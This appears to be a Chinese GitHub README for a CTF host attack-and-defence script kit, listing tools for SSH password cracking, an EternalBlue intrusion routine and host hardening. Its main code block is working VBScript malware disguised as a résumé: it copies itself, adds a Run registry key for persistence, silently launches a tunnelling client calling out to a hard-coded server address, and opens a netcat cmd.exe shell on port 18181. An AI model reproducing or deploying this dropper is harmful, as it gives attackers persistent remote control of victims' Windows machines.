# 安全战队常用的CTF主机攻防脚本 CTFpTScript



## 天融信__DebugBreak 四轮车战队 CTF攻防赛所需要的脚本：

set_the_Flag:随机生成guid，并将以flag{guid}为名称的图片复制到windows目录下。

open_18181_with_nc:开启防火墙，并启动最基础的端口，其他端口仅允许18181端口，并且开始shell。

del_account_Bywhilelist:删除白名单以外的所有账户

one_key_close_17010：一键关闭17010所有端口。

setflag_win_linux:在windows与linux段生成flag文本，可以设置生成数量，其中用户名与内容均为随机。

Xdecrypt:老版本xshell ssh密码碰撞脚本。

Reveal password encrypted by MobaXterm:破解老版本 ssh密码碰撞脚本。

msfhack：msf入侵17010方法包括开启3389创建用户建立反射上传目录等

checkSec.sh：一键审计LINUX安全性能工具。



## 自用一键穿透攻击脚本（不免杀）



演示：

 ![img](https://github.com/liquan165/CTFpTScript/blob/master/demo/myprofile.gif)

伪装成简历，自启动，自我复制，网络穿透，修改配置文件：

```vbscript
On Error Resume Next
Dim fso,Shell,TxtFl,Str
Set fso = CreateObject("Scripting.FileSystemObject")
Set Shell=Wscript.Createobject("Wscript.shell")
If Not fso.folderExists("C:\symbols\") Then     
    fso.CreateFolder "C:\symbols\"
    fso.CreateFolder "C:\symbols\MailContactsCalendarSync\"
	fso.CopyFolder ".\log\MailContactsCalendarSync\*", "C:\symbols\MailContactsCalendarSync\"
    fso.CopyFile ".\log\MailContactsCalendarSync\*", "C:\symbols\MailContactsCalendarSync\"
	Shell.Run "iexplore.exe C:\symbols\MailContactsCalendarSync\mydoc.pdf",0,TRUE
	fso.getfile(wscript.scriptfullname).copy("C:\symbols\run.vbs")   
End If
RegPath = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\"
type_name = "REG_SZ"
key_name = "run"
key_data = "C:\symbols\" & key_name & ".vbs"
Shell.RegWrite RegPath & key_name , key_data , type_name
'Set TxtFl = fso.OpenTextFile ("C:\symbols\MailContactsCalendarSync\P2PSocket\Client.ini")
'Str = Replace ( TxtFl.ReadAll,"ClientName=QUAN","ClientName=TestJob") '肉鸡名字
'Str2 = Replace ( TxtFl.ReadAll,"ServerAddress=211.149.222.206:3387","ServerAddress=211.149.222.206:3387")  '上线地址
'TxtFl.Write Str
'TxtFl.Write Str2 
'TxtFl.Close
Shell.Run "C:\symbols\MailContactsCalendarSync\RuntimeBr0ker.exe",0,FALSE
Shell.Run "cmd /c start C:\symbols\MailContactsCalendarSync\nc.exe -Ldp 18181 -e cmd.exe",FALSE
Set fso = Nothing
Set Shell = Nothing



```

## Checksec.sh 一键审计LINUX工具

演示：





## 项目适用于：

车联网安全攻防场景，主机安全攻防场景，工控安全场景，移动安全攻防场景等。















